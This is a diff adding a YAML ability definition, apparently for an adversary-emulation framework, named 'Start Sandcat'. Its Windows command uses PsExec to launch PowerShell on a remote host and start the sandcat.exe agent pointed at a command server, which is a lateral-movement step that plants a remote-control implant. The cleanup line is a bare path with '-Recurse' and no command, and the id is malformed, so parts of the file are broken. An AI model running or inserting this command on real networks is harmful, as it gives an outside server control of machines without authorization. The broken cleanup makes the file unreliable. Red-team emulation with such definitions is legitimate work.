@@ -1,0 +1,16 @@
+---
+
+- id: 3b4f745a-7ed2-4bf0-91fd-6357f871b6b
+  name: Start Sandcat
+  description: Runs the sandcat agent on a machine
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1017
+    name: Application Deployment Software
+  executors:
+    windows:
+      command: |
+        C:\Windows\System32\PSTools\PsExec64.exe \\#{remote.host.ip} powershell.exe "{Start-Process -FilePath "C:\Users\Public\sandcat.exe" -ArgumentList "#{server} #{group}"}"
+      payload: sandcat.exe
+      cleanup: |
+        C:\Windows\System32\PSTools\ -Recurse
